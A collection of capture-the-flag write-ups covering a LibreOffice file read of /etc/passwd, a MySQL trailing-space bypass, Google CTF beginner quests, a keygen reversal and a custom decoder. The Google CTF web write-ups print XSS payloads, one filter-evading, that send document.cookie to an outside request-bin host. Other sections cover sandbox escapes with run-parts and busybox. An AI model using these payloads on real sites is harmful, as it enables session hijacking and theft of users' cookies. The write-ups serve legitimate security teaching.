 </office:body>
</office:document>
```

When placed in the compiler we get this output!

![](./images/passwd.png)

This is the last line of the `/etc/passwd` file and shows the arbitrary file read attack was successful. This attack is very interesting because it can be executed through normally innate files such as a spreadsheet or word document.

Using the home directory we can see `/home/libreoffice_admin` as the users home directory. With a little trial and error, the file path used was `/home/libreoffice_admin/flag`.

![](./images/flag.png)

FLAG
```
fb{wh0_7h0u6h7_l1br30ff1c3_c4n_b3_u53ful}
```



### File: CTF_Writeups/2019/FacebookCTF/products_manager/README.md

![](./brief.png)

At the beginning of the challenge, we are provided with a simple web application.

![](./images/start_page.png)

Alongside this, we are provided with the source code of the application.

On inspection of the source code, it seems SQL Injection isn't an option due to correct preparation of the 
SQL statements. 

E.g.
```php
[...]
global $db;
  $statement = $db->prepare(
    "SELECT name, description FROM products WHERE name = ?"
  );
  check_errors($statement);
  $statement->bind_param("s", $name);
[...]
```

Reading in the source code there is a comment at the start that shows how we can get the flag: 

```php
/*
INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');
INSERT INTO products VALUES('messenger', sha256(....), ....);
INSERT INTO products VALUES('instagram', sha256(....), ....);
INSERT INTO products VALUES('whatsapp', sha256(....), ....);
INSERT INTO products VALUES('oculus-rift', sha256(....), ....);
*/
```
We somehow need to reach the description value of the `facebook` element

# Exploit

The exploitable code is here:
```php
function handle_post() {
  global $_POST;

  $name = $_POST["name"];
  $secret = $_POST["secret"];

  if (isset($name) && $name !== ""
        && isset($secret) && $secret !== "") {
    if (check_name_secret($name, hash('sha256', $secret)) === false) {
      return "Incorrect name or secret, please try again";
    }

    $product = get_product($name);

    echo "<p>Product details:";
    echo "<ul><li>" . htmlentities($product['name']) . "</li>";
    echo "<li>" . htmlentities($product['description']) . "</li></ul></p>";
  }

  return null;
}
```

The `check_name_secret` checks that a product exists with the entered `name` and `secret` combo. 

However, the `get_product` function only returns an element from the database by using the `name` parameter! 
This means we can add another element called `facebook` with a `secret` we know and get the program to return the first product found with the name `facebook` i.e. the one with the flag!

However, trying to do this we get this error:

```
Error: Product name already exists, please enter again
```

Let's try adding a space?

This gives us:

```
Product has been added
```

Then using the details we submitted, when we view the `facebook` product the flag is returned!

![](./images/flag.png)

This is an issue with MySQL. Taking a [quote](https://dev.mysql.com/doc/refman/5.7/en/char.html) from the documentation:

```
All MySQL collations are of type PADSPACE. 
This means that all CHAR, VARCHAR, and TEXT 
values in MySQL are compared without regard 
to any trailing spaces. 
```

This results in the MySQL statement treating `"facebook "` the same as `"facebook"` etc.

FLAG:
```
fb{4774ck1n9_5q1_w17h0u7_1nj3c710n_15_4m421n9_:)}
```



### File: CTF_Writeups/2019/GoogleCTF/BeginnerQuests/CookieWorldOrder/README.md

![](./images/logo.png)

We're initially provided with a webpage including a cauliflower video and a chat system.

![](./images/start.png)

With the name of the challenge as a hint, we may be tasked with stealing cookies. This suggests XSS (Cross Site Scripting) will be involved. 

The first thing to try is classic XSS payload:

```html
<script>
    alert('xss')
</script>
```
This will display a pop-up with the text `XSS` if the website is vulnerable.

This, however, gets filtered out by the system:

![](./images/hacker.png)

We're going to have to be clever about this.

Using the [OWASP XSS Cheat sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). We can try and circumvent the check.

After some trial and error we come across the payload:

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

When executed it is decoded as:
```html
<img src=x onerror="javascript:alert('XSS')">
```

Writing a quick python script to encode this gives us the ability to make custom XSS exploits that will pass the filter.

To steal the cookie, we're going to use a "request bin" this will absorb and record all values sent to it.

Using the link to the newly initialized request bin, we can form the payload:
```javascript
javascript:document.location='https://postb.in/1561312937795-3777385130524?cookie='+document.cookie;
```
This will take all the values stored in cookies and send them to the url. This will allows us to view the values of all cookies.

And when encoded gives us this unit:
```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000100&#0000111&#0000099&#0000117&#0000109&#0000101&#0000110&#0000116&#0000046&#0000108&#0000111&#0000099&#0000097&#0000116&#0000105&#0000111&#0000110&#0000061&#0000039&#0000104&#0000116&#0000116&#0000112&#0000115&#0000058&#0000047&#0000047&#0000112&#0000111&#0000115&#0000116&#0000098&#0000046&#0000105&#0000110&#0000047&#0000049&#0000053&#0000054&#0000049&#0000051&#0000049&#0000050&#0000057&#0000051&#0000055&#0000055&#0000057&#0000053&#0000045&#0000051&#0000055&#0000055&#0000055&#0000051&#0000056&#0000053&#0000049&#0000051&#0000048&#0000053&#0000050&#0000052&#0000063&#0000099&#0000111&#0000111&#0000107&#0000105&#0000101&#0000061&#0000039&#0000043&#0000100&#0000111&#0000099&#0000117&#0000109&#0000101&#0000110&#0000116&#0000046&#0000099&#0000111&#0000111&#0000107&#0000105&#0000101&#0000059">
```

That when entered will re-direct your own page as well as the admins.

This will provide this output in the request bin

![](./images/flag.png)

Thus, giving us the flag!

FLAG:
```
CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}
```


### File: CTF_Writeups/2019/GoogleCTF/BeginnerQuests/EnterSpaceTimeCoordinates/README.md

![](./images/logo.png)

We're initally provided with a binary with the output:

```
Travel coordinator
0: AC+79 3888 - 55103306031561, 216201472799928
1: Pliamas Sos - 117145678638203, 50486337082353
2: Ophiuchus - 15727012071737, 71740065771621
3: Pax Memor -ne4456 Hi Pro - 214688618709411, 26513518243538
4: Camion Gyrin - 37072631554325, 150823598069560
5: CTF - <REDACTED>

Enter your destination's x coordinate:
>>> 
```

Each time the binary is executed the coordinates change. 

Running the simple command of `strings` on the binary will reveal all character strings baked into the binary

Filtering through the output we can see the flag in plain text. Nice litte quick introduction to the CTF

```
[..]
Arrived at the flag. Congrats, your flag is: CTF{welcome_to_googlectf}
[..]
```

FLAG
```
CTF{welcome_to_googlectf}
```


### File: CTF_Writeups/2019/GoogleCTF/BeginnerQuests/GovernmentAgricultureNetwork/README.md

![](./images/logo.png)

We're initially provided with a simple webpage

![](./images/start.jpg)

Functionality is provided that allows us to create a post. When submitting we are provided with this prompt:

```
Your post was submitted for review. Administator will take a look shortly. 
```

This leads me to believe that we're going to have to execute an attack to steal cookies from an administrator.

Lets see if the `admin` clicks on our links. For this I will be using [PostBin](https://postb.in)

Submitting just a link results in no direct access to our request bin. We're going to have to try a different technique.


The other way to attempt this is to submit a XSS (Cross Site Scripting) attack that will automatically redirect the victim.

This can be achieved with the code:
```html
<script>
    location.href="<URL>"
</script>
```

This will automatically redirect the victim to the URL of our choice.

Putting this together with out request bin we get the final payload;

```html
<script>
    location.href = 'https://postb.in/1561291979505-8530671542976?cookie='+document.cookie;
</script>
```

When entered we get the `cookie` values from the admin!

```
cookie: 
    flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}; 
    session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV
```

FLAG:
```
CTF{8aaa2f34b392b415601804c2f5f0f24e}
```


### File: CTF_Writeups/2019/GoogleCTF/BeginnerQuests/HomeComputer/README.md

![](./images/logo.png)

We're initially provided with a `.ntfs` volume called `family.ntfs`.

Mounting the volume can be achived like so:

```
sudo mount family.ntfs /mnt
```
This will position the file at the `/mnt` file path and gives us the ability to explore the filesystem.

On initial inspection the operating system present on the drive is Windows based. Alongside this, lots of the files on the system are empty. This explains the tiny `25mb` size.

In the `/Users/Family/Documents` path is a text file containing:

```
I keep pictures of my credentials in extended attributes.
```

With my experience I know this is a well known technique for 'hiding' information is a special type of file metadata. This is called the [Extended Attributes](https://en.wikipedia.org/wiki/Extended_file_attributes).

Any hidden attributes can be detected using the tool `getfattr`. Running it on the `credentials.txt` reveals a hidden attribute

```
# file: credentials.txt
user.FILE0
```

Reading through the man page of the `getfattr` tool gives the the command line option:

```
    --only-values
           Dump out the raw extended attribute value(s) without encoding them.
```

This therefore, lets us retrieve the data.

Pipping it into a file like so:

```
getfattr --only-values credentials.txt > flag.png
```

Gives us the image:

![](./images/flag.png)


FLAG:
```
CTF{congratsyoufoundmycreds}
```


### File: CTF_Writeups/2019/GoogleCTF/BeginnerQuests/Satellite/README.md

![](./images/logo.png)

The challenge initally provides us with a binary `init_sat` that provides this output:

```
Hello Operator. Ready to connect to a satellite?
Enter the name of the satellite to connect to or 'exit' to quit
>>>
```

Using the `README.pdf` document provided we can get the name to enter `osmium` as it is written on the picture of the satellite.

![](./images/satellite.png)

That gives us a link to a GDoc with a `base64` string:
```
VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg==
```

This gives us some credentials:
```
Username: wireshark-rocks
Password: start-sniffing!
```

This is effectively a hint to capture traffic using `Wireshark`.

Using `strace` we can see that connections are occurring with the binary

```
strace -f -e trace=network ./init_sat 
```

```
[..]
[pid 11528] getpeername(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("34.76.101.29")}, [112->16]) = 0
[..]
```

We get some connections over TCP to the ip address `34.76.101.29`

We'll use this in the filter for `Wireshark` to reduce the results

Using the filter we can see the `TCP Handshake` occuring between our client and the server

![](./images/wireshark.png)


On further inspection of the packets we can see the `username` and `password` has been transfered in plain text! 

The communication between this address is visible and we can see the flag

```
[..]
0040   4c 26 86 d1 55 73 65 72 6e 61 6d 65 3a 20 62 72   L&..Username: br
0050   65 77 74 6f 6f 74 20 70 61 73 73 77 6f 72 64 3a   ewtoot password:
0060   20 43 54 46 7b 34 65 66 63 63 37 32 30 39 30 61    CTF{4efcc72090a
0070   66 32 38 66 64 33 33 61 32 31 31 38 39 38 35 35   f28fd33a21189855
0080   34 31 66 39 32 65 37 39 33 34 37 37 66 7d 09 31   41f92e793477f}.1
[..]
```

FLAG:
```
CTF{4efcc72090af28fd33a2118985541f92e793477f}
```


### File: CTF_Writeups/2019/GoogleCTF/BeginnerQuests/WorkComputer/README.md

![](./images/logo.png)

# Main Flag

The challenge starts by providing us with a command prompt. However, is immediately apparent that commands are missing and you're unable to `cat` out files.

Listing out `/usr/bin` or `/bin` (where system binaries are stored) allows us to view what we can execute.

Using this information alongside the beautiful website ![gtfobins](./https://gtfobins.github.io). I am able to search for binaries that allow us to read a file.

After a little trial and error I come across the command `fold` that is used to wrap text to fit a specified width.

This, however, allows us to read local files! Taking the code snippet from `gtfobins` 

```
LFILE=file_to_read
fold -w99999999 "$LFILE"
```

We're able to print the `READEME.flag` to get the first flag (`-w` is just to specify the character width)

```bash
fold -w 1000 README.flag
```

FLAG:
```
CTF{4ll_D474_5h4ll_B3_Fr33}
```

# Bonus Flag

Alongside the previous flag there is another flag called `ORME.flag`, however it has 000 permissions (I.e. nobody can read or write it). We do, however, own the file so we can change the permissions using `chmod`. 

The 000 permissions are shown bellow:
```
----------    1 1338     1338            33 Jun 23 17:20 ORME.flag
```

This would all well and good if the `chmod` binary was present on the machine, it is not so we need to find another way.

On the machine all the binaries are being linked to `busybox`. This is a binary designed to house all required binaries in a convenient bundle. This is our target as it will have the required `chmod` baked in!

However, attempting to run it gives us:

```
busybox can not be called for alien reasons.
```

We're, again, going to have to find another way. 

After attempts to change the name of the binary with `install` and other ineffective methods I finally found what I've been looking for. A binary called `run-parts`.

`run-parts` is used to execute all scripts in a directory, this means we can run `busybox` without it being filtered!

For ease of output I made a copy of the `busybox` binary in the `/tmp` directory using `install`:

```
install /bin/busybox /tmp
```

This allows me to only run that script instead of all of the binaries in `busybox`'s home `/bin`

Then running the command:

```
run-parts /tmp"
```

Gives us the output:

```
BusyBox v1.29.3 (2019-01-24 07:45:07 UTC) multi-call binary.
BusyBox is copyrighted by many authors between 1998-2015.
Licensed under GPLv2. See source distribution for detailed
copyright notices.

Usage: busybox [function [arguments]...]
   or: busybox --list[-full]
   or: busybox --install [-s] [DIR]
   or: function [arguments]...

	BusyBox is a multi-call binary that combines many common Unix
	utilities into a single executable.  Most people will create a
	link to busybox for each function they wish to use and BusyBox
	will act like whatever it was invoked as.

Currently defined functions:
	[, [[, acpid, add-shell, addgroup, adduser, adjtimex, arch, arp,
	arping, ash, awk, base64, basename, bbconfig, beep, blkdiscard, blkid,
	blockdev, brctl, bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown,
	chpasswd, chroot, chvt, cksum, clear, cmp, comm, conspy, cp, cpio,
	crond, crontab, cryptpw, cut, date, dc, dd, deallocvt, delgroup,
	deluser, depmod, df, diff, dirname, dmesg, dnsdomainname, dos2unix, du,
	dumpkmap, dumpleases, echo, ed, egrep, eject, env, ether-wake, expand,
	expr, factor, fallocate, false, fatattr, fbset, fbsplash, fdflush,
	fdformat, fdisk, fgrep, find, findfs, flock, fold, free, fsck, fstrim,
	fsync, fuser, getopt, getty, grep, groups, gunzip, gzip, halt, hd,
	hdparm, head, hexdump, hostid, hostname, hwclock, id, ifconfig, ifdown,
	ifenslave, ifup, init, inotifyd, insmod, install, ionice, iostat, ip,
	ipaddr, ipcalc, ipcrm, ipcs, iplink, ipneigh, iproute, iprule,
	iptunnel, kbd_mode, kill, killall, killall5, klogd, less, link,
	linux32, linux64, ln, loadfont, loadkmap, logger, login, logread,
	losetup, ls, lsmod, lsof, lspci, lsusb, lzcat, lzma, lzop, lzopcat,
	makemime, md5sum, mdev, mesg, microcom, mkdir, mkdosfs, mkfifo,
	mkfs.vfat, mknod, mkpasswd, mkswap, mktemp, modinfo, modprobe, more,
	mount, mountpoint, mpstat, mv, nameif, nanddump, nandwrite, nbd-client,
	nc, netstat, nice, nl, nmeter, nohup, nologin, nproc, nsenter,
	nslookup, ntpd, od, openvt, partprobe, passwd, paste, patch, pgrep,
	pidof, ping, ping6, pipe_progress, pkill, pmap, poweroff, powertop,
	printenv, printf, ps, pscan, pstree, pwd, pwdx, raidautorun, rdate,
	rdev, readahead, readlink, readprofile, realpath, reboot, reformime,
	remove-shell, renice, reset, resize, rev, rfkill, rm, rmdir, rmmod,
	route, run-parts, sed, sendmail, seq, setconsole, setfont, setkeycodes,
	setlogcons, setpriv, setserial, setsid, sh, sha1sum, sha256sum,
	sha3sum, sha512sum, showkey, shred, shuf, slattach, sleep, smemcap,
	sort, split, stat, strings, stty, su, sum, swapoff, swapon,
	switch_root, sync, sysctl, syslogd, tac, tail, tar, tee, test, time,
	timeout, top, touch, tr, traceroute, traceroute6, true, truncate, tty,
	ttysize, tunctl, udhcpc, udhcpc6, umount, uname, unexpand, uniq,
	unix2dos, unlink, unlzma, unlzop, unshare, unxz, unzip, uptime, usleep,
	uudecode, uuencode, vconfig, vi, vlock, volname, watch, watchdog, wc,
	wget, which, whoami, whois, xargs, xxd, xzcat, yes, zcat
```

This means busybox has been sucessfully run!

Using this alongside the `--arg` parameter of `run-parts` we can spawn an actual shell that will have zero restrictions.

Running:
```
run-parts /tmp --arg sh
```
Spawns us a shell that allows us to run `busybox`

This lets us run (777 Means everyone can read, write and execute the file. The most open permission you can apply to a file)
```
busybox chmod 777 /challenge/ORME.flag
```

We can now retrieve the flag with:

```
busybox cat /challenge/ORME.flag
```

FLAG:
```
CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}
```

# Alternative Solutions

With a challenge like this with the huge number of different binaries and all their sub-options there is bound to be more than one way to complete the challenge. Here I will document any other solutions and their authors, so please if you have a working solution that is not listed here please contact me and I'll add it to the README.

## Alternative Main Solutions

### tar
Credit: [madushan1000](https://github.com/madushan1000)

`tar` can be used to print out the flag as it is being compressed into a archive.

Running: 
```
tar cvf - README.flag
```

Will produce the output:
```
README.flag0000400000247200024720000000003413504135746010423 0ustar  13381338README.flag
CTF{4ll_D474_5h4ll_B3_Fr33}
```

### iconv
Credit: [TheSeanis](https://github.com/TheSeanis), [ArtificialAmateur](https://github.com/ArtificialAmateur)

`iconv` can also be used to print the conetents of a file. `iconv` is used to convert the encoding of text.

Running just:
```
iconv README.flag
```

I really like this solution as it's the cleanest one I've seen so far.

## Alternative Bonus Solutions

### upx
Credit: [madushan1000](https://github.com/madushan1000)

On the machine is the binay `upx`. This is used to pack binaries, however this can be used to pack `busybox` into a frakenstien `chmod` binary that will allow us to change the permissions of the `ORME.flag`.

Running:
```
upx  -ochmod /bin/busybox
```

Will create us a file called `chmod` that when executed can be used like the official tool.

Same as above running:

```
./chmod 777 ORME.flag
```

Will change the permissions and allow us to view the file!


### File: CTF_Writeups/2019/GoogleCTF/README.md

# Google CTF

<img align="right" width=150 src="./logo.png"/>

### Web

[```GovernmentAgricultureNetwork```](./BeginnerQuests/GovernmentAgricultureNetwork/README.md)

[```Cookie World Order```](./BeginnerQuests/CookieWorldOrder/README.md)

### Networking
[```Satellite```](./BeginnerQuests/Satellite/README.md)

### Forensics

[```Home Computer```](./BeginnerQuests/HomeComputer/README.md)

### Sandbox
[```Work Computer```](./BeginnerQuests/WorkComputer/README.md)

### Misc

[```Enter Space Time Coordinates```](./BeginnerQuests/EnterSpaceTimeCoordinates/README.md)



### File: CTF_Writeups/2019/NACTF/Keygen/README.md

![](./logo.png)

We're initially provided with a binary that checks an entered key.

```
$ ./keygen-1 KEY
Invalid key.
```

Running file on the command shows we're working with a 32-bit stripped binary.
```
keygen-1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=daec6de6c97b83298ffd793d81d5a17426330985, for GNU/Linux 3.2.0, stripped
```

## Initial checks

I started by analyzing the binary using `ltrace`. This tool displays any external calls the binary makes.

```
$ ltrace ./keygen-1 KEY

__libc_start_main(0x8049311, 2, 0xffc00894, 0x80493a0 <unfinished ...>
strlen("KEY")                                                             = 3
puts("Invalid key.\n"Invalid key.

)                                                    = 14
+++ exited (status 0) +++
```

As it can be seen the program runs `strlen` on the entered key value. This suggests that the binary is looking for a specific length.

When looking at the disassembled code in `ida64` at the first call to `strlen`

![](./images/strlen.png)

It can be seen after the `str` the instruction: `cmp     eax, 0Fh` will compare the result of the `strlen` call to 15.

Running `ltrace` again with a 15 character input shows us:

```
$ ltrace ./keygen-1 AAAAAAAAAAAAAAA

__libc_start_main(0x8049311, 2, 0xfffceb64, 0x80493a0 <unfinished ...>
strlen("AAAAAAAAAAAAAAA")                                                          = 15
strstr("AAAAAAAAAAAAAAA", "nactf{")                                                = nil
puts("Invalid key.\n"Invalid key.

)                                                             = 14
+++ exited (status 0) +++
```

The program has now moved on pass the `strlen` call. The next call is to `strstr`. This command locates the position of a substring.

The `strstr` commands use was only apparent to me once I ran it dynamically through `gdb`.


The screenshot below shows the comparison of the output of `strstr` (in `EAX`) to the key passed as an argument (`ebp+0x8`).
![](./images/strstr.png)

As the comparison is checking for equality between the substring and the original string, no change should occur. The only way this would be possible is if the string started with `nactf{`. Therefore, the program is checking if the entered string starts with the target string.

The final format check is a check for a "}" at the end of the string.

This is achieved by the assembly:

```
   0x80492cb:	mov    eax,DWORD PTR [ebp+0x8]
   0x80492ce:	add    eax,0xe
   0x80492d1:	movzx  eax,BYTE PTR [eax]
   0x80492d4:	cmp    al,0x7d
```

The key string is loading with the first instruction (`ebp+0x8` is the location of the string). This pointer is then moved along 14 bytes and the value is reloaded as a single byte via the `movzx` command, this effectively zero-extends the byte to fit into the 32-bit register. The final byte is then compared to 0x7d ("}" in ascii).

## Main functionality

Now with the initial checks out of the way we can get into the main functionality of this binary.

The program then begins to loop around each individual character within the brackets.

This is a good time to look, at `ghidra`'s decompilation of the assembly:

```C
void FUN_080491b6(char *param_1)
{
  ulonglong uVar1;
  uint uVar2;
  bool bVar3;
  char *local_10;
  uint local_c;
  int local_8;
  
  local_c = 0;
  local_8 = 0;
  local_10 = param_1;
  while (local_10 < param_1 + 8) {
    uVar1 = (ulonglong)local_c;
    local_c = (uint)(uVar1 * 0x3e);
    local_8 = local_8 * 0x3e + (int)(uVar1 * 0x3e >> 0x20);
    if (('@' < *local_10) && (*local_10 < '[')) {
      uVar2 = (int)*local_10 - 0x41;
      bVar3 = CARRY4(local_c,uVar2);
      local_c = local_c + uVar2;
      local_8 = local_8 + ((int)uVar2 >> 0x1f) + (uint)bVar3;
    }
    if (('`' < *local_10) && (*local_10 < '{')) {
      uVar2 = (int)*local_10 - 0x47;
      bVar3 = CARRY4(local_c,uVar2);
      local_c = local_c + uVar2;
      local_8 = local_8 + ((int)uVar2 >> 0x1f) + (uint)bVar3;
    }
    if (('/' < *local_10) && (*local_10 < ':')) {
      uVar2 = (int)*local_10 + 4;
      bVar3 = CARRY4(local_c,uVar2);
      local_c = local_c + uVar2;
      local_8 = local_8 + ((int)uVar2 >> 0x1f) + (uint)bVar3;
    }
    local_10 = local_10 + 1;
  }
  return CONCAT44(local_8,local_c);
}
```

If we ignore some of the mess, we can see that the function is looking for characters in three different ranges:

```
   Uppercase: "@" -> "["
   Lowercase: "`" -> "{"
   Numbers:   "/" -> ":"
```

Now, working out what was happening with `local_c` and `local_8` took a while, I tried running it through a few times dynamically with `gdb` where I saw that the output to this function was being returned via `eax` and `ebx`.

This was confusing up until I noticed the `CDQ` command present at address `0804921c`. This command doubles the size of the value present in `eax` and places the overflow in `ebx`! This, therefore, means this program is returning a single large value.

With a little trial and error I was able to convert the `ghidra` attempt into actually functioning code:

```python
flag = "BBBBBBBB"

count = 0
for s in flag:
   
   count = count * 0x3e

   # Uppercase
   if '@' < s and s < '[':
      count += ord(s) - 0x41

   # Lowercase
   if '`' < s and s < '{':
      count += ord(s) - 0x47

   # Numbers
   if '/' < s and s < ':':
      count += ord(s) + 4

print(hex(count))
```

The code is quite simple in retrospect as it adds different values per character type.

With a little more searching I was able to find the target value for this function.

Using the information we gathered earlier about the value being split across `eax` and `ebx` we can see that the assembly below is checking for equality via and XOR.

```
   0x080492fd xor        EAX,0xfcaacf98
   0x08049302 xor        EDX,0x1371
   0x08049308 or         EAX,EDX
   0x0804930a test       EAX,EAX
```

Placing these values together we have the target value: `0x1371fcaacf98`

We, therefore, need to work this value backwards to obtain the flag. This can be achieved by trialing different characters and checking for exact division of the `0x3e`.

The script below allows us to reverse the target value and determine the characters:
```python
import subprocess
import random
import string
import os 

possibility = string.ascii_lowercase + \
              string.ascii_uppercase + \
              "1234567890"

TARGET_VALUE = 0x1371fcaacf98

def next_round(char, calc):
    print(chr(char))
    return calc / 0x3e

for x in range(8):
    remainder = 0

    new_temp = None

    for x in range(ord("/") + 1, ord(":")):

        calc = TARGET_VALUE - x - 4
        remainder = calc % 0x3e

        if remainder == 0:
            new_temp = next_round(x, calc)

    for x in range(ord("`") + 1, ord("{")):

        calc = TARGET_VALUE - x + 0x47
        remainder = calc % 0x3e

        if remainder == 0:
            new_temp = next_round(x, calc)

    for x in range(ord("@") + 1, ord("[")):
        calc = TARGET_VALUE - x + 0x41
        remainder = calc % 0x3e

        if remainder == 0:
            new_temp = next_round(x, calc)

    if new_temp == None:
        print("[!] No value found!")
        exit()

    else:
        TARGET_VALUE = new_temp

    print()
```

This produces the characters and allows us to recreate the flag!

Trying it with the binary:

```
$ ./keygen-1 nactf{GEZhxWsw}
Key valid!
```

Returns the valid message!

```
FLAG: nactf{GEZhxWsw}
```


### File: CTF_Writeups/2019/NACTF/README.md

# NACTF

<img align="right" width=150 src="./logo.png"/>

## Reversing

[```Keygen - Points: 600```](./Keygen/README.md)



### File: CTF_Writeups/2019/SquareCTF_2019/README.md

# Square CTF 2019

<img align="right" width=150 src="./logo.png"/>

## Snake Oil

[```decodeme - Points: 150```](./decodeme/README.md)

## Web

[```inwasmble - Point 200```](./inwasmble/README.md)


### File: CTF_Writeups/2019/SquareCTF_2019/decodeme/README.md

# decodeme

![](./_images/prompt.png)

We are provided with a `decodeme.png.enc` that contains a tonne of characters like the set below:

```
EA\6<VG?OKO@ez?c` lCMybc^>=Z8*c5G``HTxu{L6tb1&lG,{EaO*
&Y16%LsUO|`syVD4Eg/cb6>'V*`pTz_,6Q|bGM-Itr6_Ac~yzI\tlTQZ_lHMFyGJb+?	s9ZG/_yqx.ej`5#ArEDX%K-\*6{o<TJeVj
itNXijH#Qr`	{t
XXq5MONLI)~Wv CGC	_d
6dsX,>pDcZ66$ELTeF[M-dLbV[l\{V
XTLjHdb
O)WV{%a._`TUXoZ.s~gbsG}yOjsOcR
liE[ODoZ?JesMo
a,/rsLDrNXEFWK:B`/ZRL@JaAX-ziV
_$<FeNQ^zrIi@r[a8,coK
g&O/ziL/{i	co/-|ccdWi,RvvR~iO,Ng`cGl|ZMbiE[E_IDbRZRVjliOtUy[,(Kr!Lcd8TCsvW}TjA#{N	Lz_T
VVM"~{.|dvXF}0GZes	ey\UE^RWR*.YA\W
`_L)sGbX
L-l{01AT|)Rz'`.	5rE\-TrU+	w Az,gZ{b& >lh/5lWjZ"_06EbsWN,d
 #:Mcg[c(zXZ[Wr,r<5r	a
FKt<srBH?|ezU:~[sw`_rI_c4	byB#epypNiMbWO
```

Alongside this is a file called `encoder.pyc`. This file is the compiled modules for the Python interpreter. This can be trivially reversed to produce perfect python code. This was achieved using [uncompyle2](https://github.com/Mysterie/uncompyle2) and provided us with the file `encoder.py`.

`encoder.py` contains the code that 'encrypted' the `decodeme.png`. We therefore need to find a way to reverse the encryption on the file.

## `encoder.py`

The decompiled code is below:

```python
import base64, string, sys
from random import shuffle

def encode(f, inp):
    s = string.printable
    init = lambda : (list(s), [])
    bag, buf = init()

    for x in inp:
        if x not in s:
            continue
        while True:
            r = bag[0]
            bag.remove(r)
            diff = (ord(x) - ord(r) + len(s)) % len(s)
            if diff == 0 or len(bag) == 0:
                shuffle(buf)
                f.write(str.encode(('').join(buf)))
                f.write(b'\x00')
                bag, buf = init()
                shuffle(bag)
            else:
                break

        buf.extend(r * (diff - 1))
        f.write(str.encode(r))

    shuffle(buf)
    f.write(str.encode(('').join(buf)))

if __name__ == '__main__':

    fileName = "desc.txt"

    with open(fileName, 'rb') as (r):
        w = open(fileName + '.enc', 'wb')
        b64 = base64.b64encode(r.read()).decode("utf-8")
        encode(w, b64)
```

The code when encoding loaded in the `.png` file and encoded it as `base64`. The encoding algorithm was then performed on this `base64` string.

The first thing that stood out to me was the use of the `random.shuffle()` function. This takes a list a shuffles its order. This is an interesting area as you would assume randomness makes it infeasible to reverse. We'll come back to this later.

Lets take a look at the steps of the algorithm:

It begins by created a `bag` and `buf`:

```python
s = string.printable
init = lambda : (list(s), [])
bag, buf = init()
```

`string.printable` == `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_``{|}~ \t\n\r\x0b\x0c`

The `bag` contains the list of printable strings and the buffer is an empty list.

The program will then loop around for each character in the input:

```python
for x in inp:
    if x not in s:
        continue
    while True:
        r = bag[0]
        bag.remove(r)
        diff = (ord(x) - ord(r) + len(s)) % len(s)
```

And will calculate the `diff` value. The value of `r` is then removed from the bag.

The code will then check if the `diff==0` or the `bag` is empty.

If either are `true` the code will print out the current state of `buf` add a `\x00`, init the `bag` and `buf` and finish with a shuffle of the `bag`.

This is shown by the code below:
```python
shuffle(buf)
f.write(str.encode(('').join(buf)))
f.write(b'\x00')
bag, buf = init()
shuffle(bag)
```

If both are `false` the code will add into the `buf` `r` multiplied by the `diff - 1` and will print the value of `r`.

This is also shown by the code:

```python
buf.extend(r * (diff - 1))
f.write(str.encode(r))
```

## Decodings


### Step 1 - Gathering values
Now, working our way backwards we need to split each section by the null characters.

This should give us each 'block'. A block should be structured like so:

```
[     Values of R      ][XXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX]
```

Where `X` is the values of the shuffles buffer. Now, because the data is composed of an alphabet samples from the values of `r` scanning up until we find a duplicated character should give us the values of `r` used in this block!

This can then be used to look around and count the number of occurrence of each character. This value gives us the sum of `diff - 1`.

This functionality can be seen in this code that processes each block:

```python
# Find output for r
seen = []
r_output = ""

for s in section:

    if s in seen:
        break
    else:
        seen.append(s)
        r_output += s

# Grabs the remaining part of the section
data_output = section[len(r_output):]

# Counts the number of character occurance
char_count = {}
for u in set(list(data_output)):
    char_count.update({u : data_output.count(u)})
```

The order for the `r` string is only order that is useful. Therefore, the shuffling of the `buf` values does not stop us from reversing the encoding.

# Step 2 - Recover original text

We now need to use the values we've found to recover the char value of `x`. However, when `diff` is calculated the mod of `s` is taken, this means there will be realistically two potential values for each value for `diff`.

For example if the value of `r` is `48`, with a `diff` value of  this provides us with a value of `57`. We can calculate the value of `x` as `5` mod 100 (value of `s`).

The code is below:
```python
x = (diff + ord(r)) % 100
```

This means we have two potential values for x. `\x05` or `i` (`x + 100`). By checking these against the character set for a valid `base64` value we can determine the valid potential characters.

The final situation we need to check for is the satiation when there is a character in the `r` string that does not exist in the data section. This will occur when the `diff` is equal to one, this is due to the line:

```python
buf.extend(r * (diff - 1))
```

This will make `diff` is equal to zero, and will result in the character `r` not being added to list.

In summary here is the code that performs this functionality:

```python
for r in r_output:

    if r not in char_count:
        diff = 0 + 1
    else:
        diff = char_count[r] + 1

    x = (diff + ord(r)) % 100

    if chr(x) not in BASE64_CHARS:
        recovered_string += chr(x + 100)
    else:
        recovered_string += chr(x)
```

Putting all these aspects together in a script called `decoder.py`.

Running the script provides us with the image and therefore the flag:

![](./decodeme.png)

```
FLAG: flag-6f38426c5963729d
```


